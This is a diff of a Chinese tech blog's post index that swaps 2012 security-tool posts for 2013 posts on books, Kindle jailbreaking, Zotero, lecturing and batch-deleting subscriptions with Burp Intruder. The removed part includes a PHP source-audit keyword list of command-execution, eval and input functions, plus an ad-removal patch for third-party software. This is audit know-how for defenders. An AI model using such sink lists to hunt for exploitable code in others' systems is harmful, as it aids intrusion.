@@ -9,7 +9,7 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="      由于openshift可以使用git进行文件管理，其实这个过程跟管理github是一样的，不过国内针对openshift的文章很少。本文重点阐述如何在windows下进行文件管理。需要安装软件：TortoiseGit、msysgit、git。安装步骤就不说了， &hellip;">
+  <meta name="description" content="本书主要描述的是阿里巴巴创业团队从创业之初到2006年的艰辛发展历程，主角肯定是马云与阿里巴巴的故事，这位两次北上，三下杭州的英雄在互联网开始之初发现了网络的财富，从此便带领团队一直前行。综观全书，个人有如下几个小的感触： 机遇的重要性 马云为什么可以创立阿里巴巴，主要还是归咎去机遇问题， &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -56,10 +56,10 @@
 </form>
   
 <ul class="main-navigation">
-    <li><a href="/">首页</a></li>
-    <li><a href="/blog/archives">所有文章</a></li>
+    <li><a href="/">Home</a></li>
     <li><a href="http://www.ourren.com">Ourren</a></li>
     <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
+    <li><a href="/blog/archives">archives</a></li>
 </ul>
 
 </nav>
@@ -73,7 +73,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/2012/06/28/openshift_file_manage/">Openshift文件管理概述</a></h1>
+      <h1 class="entry-title"><a href="/2013/06/18/alibaba_myth_note/">阿里巴巴神话笔记</a></h1>
     
     
       <p class="meta">
@@ -82,31 +82,41 @@
 
 
 
-<time class='entry-date' datetime='2012-06-28T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+<time class='entry-date' datetime='2013-06-18T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
         
         
-            | <a href="/2012/06/28/openshift_file_manage/#comments">Comments</a>
+            | <a href="/2013/06/18/alibaba_myth_note/#comments"留言</a>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>      由于openshift可以使用git进行文件管理，其实这个过程跟管理github是一样的，不过国内针对openshift的文章很少。本文重点阐述如何在windows下进行文件管理。需要安装软件：TortoiseGit、msysgit、git。安装步骤就不说了，作为伟大的程序员不可能这点事都搞不定。
- 1、生成key
-      主要使用TortoiseGit中的Putty Key Generator工具生成private key和public key。  打开Putty Key Generator工具界面如下图所示，点击Generate后在上面空白处移动就生成字符了。
-      <img src="http://blog.ourren.com/blog/openshift_file_1.jpg" alt="openshift_file_putty" width="487" height="462">
-      最好在生成的时候设置一个密码，然后保存private key和public key文件，注意保管好你的private key文件。
-        <img src="http://blog.ourren.com/blog/openshift_file_2.jpg" alt="openshift_putty_passwd" width="487" height="462">
- 2、openshift创建项目
-      总体来说，openshift可以通过两种方式进行创建项目，一个是通过安装openshift的客户端软件，命令行创建工程，另外一个方式进行通过网页进行创建项目。这里以网站创建项目为例。  登陆网站后，选择Create Application选项卡，然后选择程序类型，就可以直接创建，这里有一篇详细的文章可作为<a href="http://lx.shellcodes.org/show/4fe87fac04b91e741c000003">参考</a>。
-3、如何更新文件
-      大体思路：在网站上提交第一步生成的public key后，本地使用git进行文件管理。
-      首先登陆网站后选择My Account 中添加public key。
-       <img src="http://blog.ourren.com/blog/openshift_file_3.jpg" alt="openshift_public_key" width="482" height="256">
-      然后选择 My Applications 后，双击我们刚新建的应用，就可以看到GIT REPOSITORY的值。
-      <img src="http://blog.ourren.com/blog/openshift_file_4.jpg" alt="openshift_ssh" width="564" height="151">
-      在本地网站开发文件夹右键git clone，填入刚刚复制的GIT REPOSITORY的值，然后选择private key为第一步保存的文件，大功告成。</p>
+  <div class="entry-content"><p><img class="aligncenter" alt="alibaba_mayun" src="http://blog.ourren.com/blog/alibaba_mayun.jpg" width="450" height="200"></p>
+
+<p>本书主要描述的是阿里巴巴创业团队从创业之初到2006年的艰辛发展历程，主角肯定是马云与阿里巴巴的故事，这位两次北上，三下杭州的英雄在互联网开始之初发现了网络的财富，从此便带领团队一直前行。综观全书，个人有如下几个小的感触：</p>
+
+<p><strong><em>机遇的重要性</em></strong></p>
+
+<p>马云为什么可以创立阿里巴巴，主要还是归咎去机遇问题，但不可否认马云的个人能力和具有先见的洞察力。同时阿里巴巴现在为什么这么牛逼，其业务的发展也是随着互联网的发展和需求而不断完善的。从最初的黄页到淘宝、支付宝的推出，这些都是实例的体现，当然这些也离不开竞争对手的相互追赶，想想易趣的发展壮大对阿里巴巴的威胁到易趣的逐渐衰落，没有竞争对手你会发展得很缓慢。</p>
+
+<p><strong><em>团队的重要性</em></strong></p>
+
+<p>阿里巴巴创始团队的湖畔生活跟《DOOM启示录》书里面的描述的湖畔生活相似：生活相当窘迫，一堆怀有梦想且有激情的年轻人不辞辛苦天天加班，忘记生活的烦恼和生活的琐事，追求的是创造世界上牛逼的产品。如果说有这么一个优秀的团队，我想还有什么可以阻止公司前进的步伐，除了公司开始的方向错了。相信任何一个创业团队都会经历这个阶段。</p>
+
+<p>与其说是创始团队人员的不弃不离，不如说是团队队员的不懈努力，不管是升职还是调遣，队员完全服从领导的安排，考虑的都是如何把未来的业绩做好。书中描述的确实可以有点偏理想化，但是从阿里的“独孤九剑”到“六脉神剑”还是体现了阿里人的价值与追求。</p>
+
+<p><strong><em>现实很骨感</em></strong></p>
+
+<p>不管是马云早期的全球战略还是后来的雅虎搜索对战百度和谷歌，可以总结为“理想很丰满，现实很骨感”。为什么早期的阿里巴巴想要走向世界，可能这里面还是跟那时的马云有很大的关系，技术能力的欠缺、各地实际情况的不同、资金的不充裕等问题当时都是很好的考虑，可以说当时的马云还是有一定的傲气；而后期雅虎搜索问题则是明显能力不足，同时选择方向不对而走向失败。</p>
+
+<p><strong><em>早做准备</em></strong></p>
+
+<p>正所谓“吃在碗里，得想到锅里”。虽然互联网发展迅速，但是每隔几年的冬天来临之际你是否做好了准备。阿里巴巴为什么能度过2次互联网危机，主要还是取决去马云的前瞻性、孙正义等风投的及时帮助、关明生的快刀斩乱麻等。这其中主要还有阿里巴巴高层的架构问题，“马云说了算”这个很重要。</p>
+
+<p><strong><em>阿里很伟大</em></strong></p>
+
+<p>不管是阿里巴巴提倡的价值观，还有其创业团队的事迹与创始人员的个人发展历程。解决了天下没有难做的生意，创造了多少人的创业梦。不可否认马云真的是互联网的教父，不管是他的演讲能力，还是他的前瞻性与价值观。</p>
 </div>
   
   
@@ -119,7 +129,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/2012/06/27/eyefoo_no_ad_patch/">Eyefoo Remove Ad Patch</a></h1>
+      <h1 class="entry-title"><a href="/2013/05/11/kpw_plugins_and_resource/">KPW插件优化与电子书资源</a></h1>
     
     
       <p class="meta">
@@ -128,26 +138,105 @@
 
 
 
-<time class='entry-date' datetime='2012-06-27T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>27</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+<time class='entry-date' datetime='2013-05-11T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
         
         
-            | <a href="/2012/06/27/eyefoo_no_ad_patch/#comments">Comments</a>
+            | <a href="/2013/05/11/kpw_plugins_and_resource/#comments"留言</a>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><!--[if gte mso 9]><xml><w:WordDocument><w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel><w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery><w:DisplayVerticalDrawingGridEvery>2</w:DisplayVerticalDrawingGridEvery><w:DocumentKind>DocumentNotSpecified</w:DocumentKind><w:DrawingGridVerticalSpacing>7.8</w:DrawingGridVerticalSpacing><w:View>Normal</w:View><w:Compatibility></w:Compatibility><w:Zoom>0</w:Zoom></w:WordDocument></xml><![endif]-->
+  <div class="entry-content"><p><img class="aligncenter" alt="kindle paperwhite" src="http://blog.ourren.com/blog/kindlepaperwhite.jpg" width="409" height="153">
+笔者最近入手了一部Kindle PaperWhite,在最近一周的使用过程中发现KPW确实不错，因而推荐大概购买。同时作为技术男一般会将买到的电子产品折腾折腾，然后打造成自己所喜欢的风格。因由于刚入KPW时对这些东西不熟悉，故将折腾的过程与一些资源记录在此，方便新手折腾和阅读。</p>
+
+<h3>适合对象</h3>
 
 
-<p>      软件介绍：EyeFoo3是一个可以定时提醒休息,保护眼睛的护眼软件、健康软件。本人一直在使用，但是在主界面和提醒该休息对话框有AD链接，看着实在不爽。So，直接去掉这广告。最初版本的时候可以通过修改AD网址去掉，翻了下地址在<a href="http://www.ourren.com/blog/eye-nurse-eyefoo-to-ad.html">这</a>；
-      补丁如下图，放在安装目录运行即可。
-<img src="http://blog.ourren.com/blog/eyefoo_no_ad.jpg" alt="eyefoo no ad patch" width="328" height="302">
-清除广告后的界面（刚基于gae搭建了图床，多贴几张^__^）。
-<img src="http://blog.ourren.com/blog/eyefoo_main.jpg" alt="eyefoo main" width="574" height="477">
-<img src="http://blog.ourren.com/blog/eyefoo_remind.jpg" alt="eyefoo remind" width="240" height="113">
-补丁下载地址：<a href="http://dl.dbank.com/c02gtqta1t">下载</a></p>
+<p>上下班需要坐车一个小时，经常出差，喜欢阅读书籍，有大量PDF文档或者书籍需要阅读。</p>
+
+<h3 id="-2">推荐理由</h3>
+
+
+<p>在这次推荐穷屌丝买Kindle PaperWhite(高富帅肯定Ipad了)，主要有几个理由：</p>
+
+<p><em>价格便宜</em></p>
+
+<p>相比于Ipad和nexus7的话，价格优势比较明显。海淘的话价格510（裸机）+90（运费）=600，淘宝代购貌似也才640多，整体而言还是比较划算，但是海淘等的时间较长（大约12天左右）。</p>
+
+<p><em>显示效果不错</em></p>
+
+<p>由于KPW是电子墨水黑白的触摸电容屏，跟纸板书的显示效果差不多，不怎么伤眼，但是屏幕确实比较小（可以设计的时候考虑到便携性方面），不管是室内还是阳光下看起来都还不错，晚上有背光灯测试效果都还不错（一般不床上看书）。</p>
+
+<p><em>电力充足</em></p>
+
+<p>如果把看书业余爱好的话，需要对阅读器的电力和显示效果要求比较多。KPW在续航能力确实够牛，每天看一个多小时，撑两周应该没什么问题，特别是经常出差的人而言，续航不是问题。</p>
+
+<p><em>系统插件多</em></p>
+
+<p>虽然KPW是基于Linux系统进行的裁剪，但是可以通过越狱安装其他系统和插件，比如说多看系统、kpvbooklet、koreader等其它系统和插件，可以说还是系统整体而言还是比较开放。</p>
+
+<h3 id="-3">系统优化</h3>
+
+
+<p>这里要非常感谢NW牛，系统方面主要有两种方式可以选择：一种是使用原系统+插件方式，可以使用amazon提供的免费云空间，同时可以利用插件来切边和内容缩放；第二种刷国内多看系统，多看系统对中文支持很好，同时也提供PDF切边等功能。笔者是先刷的多看系统，使用了一段时间后再返回原系统+插件的方式。</p>
+
+<p><em>刷多看系统</em></p>
+
+<p>步骤比较简单，拷贝三个文件，然后安装即可，具体可以参考链接1；多看系统可以在原系统和多看系统进行切换，同时多看系统也有推送模式和特有的书城，整体而言还是不错。</p>
+
+<p>在扫描版PDF文档自动切边方面没有插件方式效果好，但是操作简单点。</p>
+
+<p><em>原系统+插件</em></p>
+
+<p>其实关于Kindle安装插件有一篇非常完美的文章，参考链接2。这里面将kindle系统产品的插件安装都说了个遍。整体而言主要有以下几个步骤：jailbreak越狱&ndash;>安装kpvbooklet&ndash;>安装koreader</p>
+
+<p>支持各类格式的文档，同时可以使用amazon的云空间，切边和缩放效果比较好，但是需要手动进行操作。</p>
+
+<h3 id="-4">字典安装</h3>
+
+
+<p>KPW原装系统可以对文档进行单词翻译，但是如果安装了koreader后，默认打开方式为koreader，因此需要使用其他方式进行页面查词。</p>
+
+<p>Koreader支持stardict格式词典，并且可在重排页面內查词。stardict词典下载地址：<a href="http://abloz.com/huzheng/stardict-dic/">stardict下载</a></p>
+
+<p>在这个页面上选择词典并下载，然后解压并拷贝到(<em>.idx, </em>.ifo, *.dict) 到 koreader/data/dict目录即可。</p>
+
+<h3 id="ocr">OCR取词</h3>
+
+
+<p>koreader支持扫描PDF文档取词，采用的OCR方式取词，因此需要OCR字库，下载地址：<a href="http://pan.baidu.com/share/link?shareid=121861&uk=2097578811">tesseract下载</a></p>
+
+<p>下载后拷贝全部文件到koreader/data/tessdata文件夹下面即可。</p>
+
+<h3 id="-4">海淘教材</h3>
+
+
+<p>收集了一些海淘教程，可以先看下参考链接中3-6中的教程，遇到问题的时候注意看下各个帖子中的讨论和留言部分。</p>
+
+<h3 id="-5">电子书资源</h3>
+
+
+<p>电子书方面原来是有优秀的“爱看豆”网站，结果刚拿到Kindle的时候就关闭了。好在现在还有一些优秀的电子书资源站，特地总结如下：</p>
+
+<p><a href="http://www.sec-wiki.com/topic/16" target="_blank">电子书下载资源汇总</a></p>
+
+<address> </address>
+
+
+<h3 id="-6">参考链接</h3>
+
+
+<ol>
+    <li><a href="http://bbs.duokan.com/forum/thread-70780-1-1.html">多看 2013 for Kindle 常见问题解答</a></li>
+    <li><a href="http://vislab.bjmu.edu.cn/blog/hwangxin/2012/10/read-scanned-pdfs-with-kindlepdfviewer/">让Kindle支持扫描版PDF重排</a></li>
+    <li><a href="http://www.douban.com/group/topic/36603646/">kpw海淘教学</a></li>
+    <li><a href="http://www.douban.com/review/5808144/">日本亚马逊海淘Kindle Paperwhite 教程攻略</a></li>
+    <li><a href="http://www.douban.com/group/topic/36912443/">通过财付通境外支付功能支付</a></li>
+    <li><a href="http://blog.sina.com.cn/s/blog_65f386930101bece.html">日本亚马逊Jshoppers转运海淘kindle paperwhite图文攻略</a></li>
+</ol>
+
 </div>
   
   
@@ -160,7 +249,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/2012/06/08/php_webshell_scan_tool/">Php Webshell Scan Tool</a></h1>
+      <h1 class="entry-title"><a href="/2013/04/15/zotero_setting/">文献管理工具Zotero</a></h1>
     
     
       <p class="meta">
@@ -169,27 +258,39 @@
 
 
 
-<time class='entry-date' datetime='2012-06-08T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+<time class='entry-date' datetime='2013-04-15T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
         
         
-            | <a href="/2012/06/08/php_webshell_scan_tool/#comments">Comments</a>
+            | <a href="/2013/04/15/zotero_setting/#comments"留言</a>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>通过两种扫描方式（关键字匹配、token语句分析）实现对webshell后门的检测。可以针对目录批量扫描，也可以对单个文件通过token分析其语句。其中关于php tokens解析方法在<a href="/2012/03/20/php_lexical_analysis.html">浅谈php中的词法分析 </a>有提到具体实现，实际情况还是得结合敏感函数，不过相对而加密后的文件应该效果更好,具体检测原理见Monyer的文章<a href="http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63">常见 Webshell 的检测方法及检测绕过思路</a>。通过实际测试发现：alibaba在t00ls发布的scanner.php工具可以检测出现有的大部分后门，效果不错。</p>
+  <div class="entry-content"><p><img class="aligncenter" alt="文献管理" src="http://blog.ourren.com/blog/wenxian_zotero.jpg" width="454" height="138"></p>
 
-<p>本工具只是整合了alibaba和Monyer两种扫描方法和代码，在此表示感谢。</p>
+<p>自从在豆瓣上看到<a href="http://www.douban.com/note/269931592/" target="_blank">文献管理软件Zotero基础及进阶示范</a>后，发现Zotero已经有Windows客户端了，并且可以利用dropbox/快盘进行同步，果断把原来使用的<em>Mendeley</em>卸载了。在这一周多的使用时间内感觉非常不错，因而推荐给大家。</p>
 
-<p>测试效果如图：</p>
+<p><strong>使用范围</strong></p>
 
-<p><a href="http://blog.ourren.com/blog/simplescan.jpg"><img class="aligncenter" title="simplescan" src="http://blog.ourren.com/blog/simplescan.jpg" alt="" width="1024" height="450"></a></p>
+<p>Zotero主要用来管理<strong>PDF文档</strong>或者演讲<strong>PPT</strong>进行管理和批注，其他网页内容和文本资料推荐用evernote/有道云笔记进行管理。</p>
 
-<p> </p>
+<p><strong>使用方案</strong></p>
 
-<p>工具下载：<a href="http://code.google.com/p/ourren/downloads/list">下载</a></p>
+<p>PDF或者Slide附件采用网盘云同步，而批注采用官网提供的免费云同步。</p>
+
+<p><strong>网盘同步设置</strong></p>
+
+<p>由于上面提到的文章中只对Linux系统的网盘同步设置进行了详细说明，而有时候会使用Windows，因此补充如下：</p>
+
+<p>Linux:   ln -s /users/ouyang/dropbox/zotero/storage /users/ouyang/dev/zotero/storage</p>
+
+<p>Windows 7:  mklink /D D:\Zotero\storage E:\sync\Zotero\storage</p>
+
+<p>Windows XP: junction D:\Zotero\storage E:\sync\Zotero\storage</p>
+
+<p>其中：<a href="http://download.sysinternals.com/files/Junction.zip" target="_blank">junction</a>可以在MS网站上<a href="http://download.sysinternals.com/files/Junction.zip" target="_blank">下载</a>.</p>
 </div>
   
   
@@ -202,7 +303,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/2012/06/08/dencode_tool/">编解码工具 DEncode1.1 更新</a></h1>
+      <h1 class="entry-title"><a href="/2013/03/24/lecture_is_an_art/">培训是一门艺术</a></h1>
     
     
       <p class="meta">
@@ -211,18 +312,59 @@
 
 
 
-<time class='entry-date' datetime='2012-06-08T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+<time class='entry-date' datetime='2013-03-24T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
         
         
-            | <a href="/2012/06/08/dencode_tool/#comments">Comments</a>
+            | <a href="/2013/03/24/lecture_is_an_art/#comments"留言</a>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>DEncode1.1更新说明<br>1、增加了LM、NT、LM/NThash加密方式。<br>2、增加了原来漏掉的HTML解码功能。<br>3、增加了字符替换功能。
-DEncode1.0 介绍文章：<a href="http://www.ourren.com/blog/encoding-and-decoding-tools-decode.html">链接<br></a>工具下载：<a href="http://code.google.com/p/ourren/downloads/list">下载</a></p>
+  <div class="entry-content"><p><img class="aligncenter" alt="差别对待看你怎么看" src="http://blog.ourren.com/blog/chabieduidai.jpg" width="522" height="150"></p>
+
+<p>现在社会中存在很多“差别对待”问题：比如说最近很火的“3.15苹果事件&#8221;，日常生活中科技产品、汽车业、求职与工作等也经常出现这种问题，当人们遇到这种事情的时候首先想到不对等待遇，需要采用法律手段维护权利。但是有时候还真的需要采用差别对待才能把事情做好，当然这个跟上面提到的用户权利有所差别，最近小编就遇到了这方面的小问题，特此记录下。</p>
+
+<p>最近博主由于其他原因去给“<em>初中生</em>”讲讲计算机基础，由于个人原来在小组和其他人员也有做过计算机类技术分享和一些课程讲解，再说自认为个人在Windows软硬件基础、移动平台、互联网发展等方面有比较深入的理解，因此准备的时候就网上随便找了下课件稍微修改了下，自我感觉不错。在实际讲解中，从计算机发展讲到计算机硬件、到移动互联网发展、到桌面与移动平台操作系统发展等，虽然在讲解的时候跟下面进行交流，但是他们基本上不发言，导致效果真的很差。讲完后跟他们进行了沟通，发现他们虽然很感兴趣，但是基本上听不懂。</p>
+
+<p>回来后进行了思考，归纳下主要有几方面问题：</p>
+
+<div>
+<ul>
+    <li>对象不同，需要差别对待</li>
+</ul>
+面对不同对象，需要差别对待。针对培训或者演讲你需要的是将大部分人讲懂，因此你需要站在大部分人的基础水平上进行讲解，不能脱离大众而偏向个别群体。互联网中各类产品又未尝不是：软件产品一般分为免费版与收费版，微博分为个人版与企业版，就连大数据分析也需要结合你的兴趣、爱好进行个人性定制等。
+<ul>
+    <li>任何事准备总是需要的</li>
+</ul>
+机会是留给有准备的人。当机会来了就需要好好准备，认真对待每一次生活琐事与大挑战。不管这件事有大小，当你完成之后，你总会有所收获的。你看台湾或者美国选举，领导人为了宣扬政策与方案，会尽全力准备和演讲；就连路边卖烧烤的阿姨这些每天都会为第二天做准备。我们又为何不好好事前准备呢，不管有多忙，时间挤挤总会有的，关键看你以什么心态面对。
+
+</div>
+
+
+<div>
+<ul>
+    <li>演讲是一门学问</li>
+</ul>
+</div>
+
+
+<p>从《国王的演讲》到奥斯卡获奖，其突出的就是英王乔治六世在矫正专家的帮助下，克服口吃，成功发表了激励民心的战前演讲，不得不说演讲真的是一门大学问。国内外安全会议众多，比如xkungfoo、blackhat、CanSecWest、OWASP、SyScan360等，如何将你的议题分享并得到大家的认可和支持是不容易的，当然这个涉及到你的议题、会议的参会人员关注方向与水平。</p>
+
+<div>
+<ul>
+    <li>书籍推荐</li>
+</ul>
+</div>
+
+
+<p>在豆瓣上看到一本关于演讲方面不错的书籍，特此推荐下（不方面购买纸质书籍的，可以安装“书香云集”然后搜索下载）。</p>
+
+<p>[美]史迪芬.E.卢卡斯 著  译者: 俞振伟 <a href="http://book.douban.com/subject/2343561/">《演讲的艺术》</a></p>
+
+<div></div>
+
 </div>
   
   
@@ -235,7 +377,7 @@ DEncode1.0 介绍文章：<a href="http://www.ourren.com/blog/encoding-and-decod
       
   <header>
     
-      <h1 class="entry-title"><a href="/2012/06/01/psatv1-0/">php源码审计工具(Psat简介)</a></h1>
+      <h1 class="entry-title"><a href="/2013/03/16/delete_wangyi_yunyuedu_rss/">批量删除网易云阅读订阅</a></h1>
     
     
       <p class="meta">
@@ -244,31 +386,58 @@ DEncode1.0 介绍文章：<a href="http://www.ourren.com/blog/encoding-and-decod
 
 
 
-<time class='entry-date' datetime='2012-06-01T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+<time class='entry-date' datetime='2013-03-16T00:00:00-07:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
         
         
-            | <a href="/2012/06/01/psatv1-0/#comments">Comments</a>
+            | <a href="/2013/03/16/delete_wangyi_yunyuedu_rss/#comments"留言</a>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>在php源码审计的时候，需要根据自己的字典进行搜索并进行分析，因此php 安全字典很重要，<a href="/2012/05/31/php_audit_dictionary.html">上一篇文章</a>总结了常见安全方面的PHP函数。Windows下我们可以通过“Search and Replace”工具结合字典进行搜索，而linux下可以通过借鉴强大的grep命令进行搜索，但是针对不同类型漏洞需要记住很多命令和参数，这样导致使用不方便。前几天刚好看到<a href="http://www.0x50sec.org/%E4%B8%80%E4%B8%AA%E7%AE%80%E9%99%8B%E7%9A%84php%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/">c4rp3nt3r</a>开源的工具，由于作者使用的是perl进行开发，通过对源码和字典关键字分析进行了二次开发，特点如下：</p>
+  <div class="entry-content"><h3> <img class="aligncenter" alt="网易云阅读" src="http://blog.ourren.com/blog/wangyiyunyuedu.jpg" width="876" height="222">
+</h3>
 
-<p>1、字典中增加了一些函数</p>
 
-<p>2、多文件搜索时默认显示不是很方便，因此可以使用选项生成报告。</p>
+<h3></h3>
 
-<p>3、再次开发更方便，直接增加字典</p>
 
-<p>软件截图：</p>
+<h3><strong>关于GoogleReader</strong></h3>
 
-<p><a href="http://blog.ourren.com/blog/psat1.jpg"><img class="aligncenter" title="psat" src="http://blog.ourren.com/blog/psat1.jpg" alt="" width="534" height="199"></a></p>
 
-<p>软件下载地址：<a href="http://code.google.com/p/ourren/downloads/detail?name=psat%20v1.0.rar">连接</a></p>
+<p>最近什么话题最火？这话要是问技术猿或者Geeker，绝对不是苍老师或者小*丽亚出什么新片没，也不是3.15晚会的“网易，央视喊你去做广告”，而是Google决定在7月1日关闭已有7年Google Reader这一震惊的消息，各类论坛社区（v2ex、知乎等）、技术资讯站（cnbeta、虎嗅、36kr等）和个人媒体（月光博客、善用佳软、微信公开平台等）都纷纷讨论：痛骂Google不懂IT民工，不懂互联网；而更多的则是讨论如何选择替代品，导致最近freedly、newsblur、digg、鲜果、有道等等都很忙，不止是服务器很忙，开发人员也很忙。各大公司也纷纷为GR粉提出解决方案，支持一键导入GR源，但是这样子是否能够解决问题呢？</p>
 
-<p>在此感谢:<a href="http://www.0x50sec.org/%E4%B8%80%E4%B8%AA%E7%AE%80%E9%99%8B%E7%9A%84php%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/">c4rp3nt3r</a></p>
+<p>本人虽然使用GR时间较晚（2011年入手），但是现在GR已经成为我日常生活中不可缺少的部分，上班的时候使用GReader Pro同步GR中的文中，下班途中或者闲暇时就拿出来翻阅下，将重要的文章和比较有用的文章加星，以方便第二天抽空时间进行精读，可以说GR与GReader Pro绝配。后来为了方便安全从业者可以分享自己感觉不错的文章，建立了<a href="http://sec-wiki.com" target="_blank">SecWiki</a>，到现在网站已经有收藏1000+文章，但是好景不长，随着GR关闭，这条路暂时关闭，这两天也把国内外这类工具试了个遍，还是没有找到一款好的产品，好在Freedly可能会开放API，GReader Pro貌似会更新、Digg会新开发产品，值得等待。</p>
+
+<h3><strong>删除缘由</strong></h3>
+
+
+<p>扯了这么多，还没说主题。</p>
+
+<p>网易云阅读是我用来看科技新闻的，软件阅览效果不错，也支持离线下载，这里推荐几个资讯源（36kr、虎嗅、知乎、爱范儿）。今天早上登陆网页版网易云阅读，主动提示可以导入Google Reader订阅栏目了，看到了吧，这两天网易开发人员也没闲着，肯定加班赶产品。手一贱，直接导入原来Google Reader项目，评价下：擦，居然没有给我导入分类信息。然后我打开手机网易云阅读软件，问题就来了，直接显示一千多订阅源，不管有没有更新的都会显示，你让我天天怎么看资讯？果断在微博上@网易云阅读提意见，自己感觉没戏。自己就是搞技术的，果断应该自己去解决，于是打开Google 开发工具（虽然以后不能用GR了，还是可以用chrome吧），抓包看了下取消订阅源的请求数据包，发现有戏，于是有了此文。一来吐槽下google停止GR服务，二来方便跟我犯同样的童鞋。</p>
+
+<h3></h3>
+
+
+<h3><strong>具体步骤</strong></h3>
+
+
+<p>工具：burp（不知道的google下）、chrome、notepad++</p>
+
+<p>1、初步分析：登陆网页版网易云阅读，登陆后开启burp代理，并试着删除一个订阅源，查看burp日志可以发现每次删除订阅源只是传递了一个id参数，熟悉burp的都知道可以用intruder功能实现重复提交；</p>
+
+<p><img class="aligncenter" alt="步骤一" src="http://blog.ourren.com/blog/wyyyd_step1.jpg" width="962" height="442"></p>
+
+<p>2、提取参数：如何提取订阅的id，果断使用正则匹配。查看web版网易云阅读的源码，复制后用正则匹配进行匹配，采用正则匹配式：(cst_rss<em>)[a-z0-9</em>]*    并保存为list.txt。</p>
+
+<p><img class="aligncenter" alt="步骤2" src="http://blog.ourren.com/blog/wyyyd_step2.jpg" width="1275" height="661"></p>
+
+<p><img class="aligncenter" alt="步骤2_2" src="http://blog.ourren.com/blog/wyyyd_step3.jpg" width="958" height="513"></p>
+
+<p>3、完工：使用burp的intruder批量实现删除订阅源，将刚测试的burp历史记录发送到intruder选项，添加变量并指定字典，发送。</p>
+
+<p><img class="aligncenter" alt="步骤3" src="http://blog.ourren.com/blog/wyyyd_step4.jpg" width="975" height="366"></p>
 </div>
   
   
@@ -281,7 +450,7 @@ DEncode1.0 介绍文章：<a href="http://www.ourren.com/blog/encoding-and-decod
       
   <header>
     
-      <h1 class="entry-title"><a href="/2012/05/31/php_audit_dictionary/">PHP源码审计字典</a></h1>
+      <h1 class="entry-title"><a href="/2013/03/05/android_apps_and_learn_methods/">浅谈移动平台优秀应用与学习方法</a></h1>
     
     
       <p class="meta">
@@ -290,361 +459,78 @@ DEncode1.0 介绍文章：<a href="http://www.ourren.com/blog/encoding-and-decod
 
 
 
-<time class='entry-date' datetime='2012-05-31T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
+<time class='entry-date' datetime='2013-03-05T00:00:00-08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
         
         
-            | <a href="/2012/05/31/php_audit_dictionary/#comments">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>对涉及PHP安全方面的函数进行了归类，参照了很多文章和博客，在此表示感谢。
-[code lang=&ldquo;php&rdquo;]1.include/require/require_once/include_once/file_get_contents
-2.exec/system/popen/passthru/proc_open/pcntl_exec/shell_exec
-3.eval/preg_replace/assert/call_user_func/call_user_func_array/create_function
-4.<em>GET/</em>POST/<em>COOKIE/</em>SERVER/<em>REQUEST/</em>ENV/php://input/getenv/
-5.session/cookie
-6.extract/parse_str/mb_parse_str/import_request_variables/unserialize
-7.copy/rmdir/chmod/delete/fwrite/fopen/readfile/fpassthru/move_uploaded_file/
-file_put_contents/unlink/upload/opendir/fgetc/fgets/ftruncate/fputs/fputcs
-8.select/insert/update/delete/order by/group by/limit/in(/stripslashes/urldecode
-9.confirm_phpdoc_compiled/mssql_pconnect/mssql_connect/crack_opendict/
-snmpget/ibase_connect
-10.echo/print/printf/vprintf/document.write/document.innerHTML/document.innerHtmlText
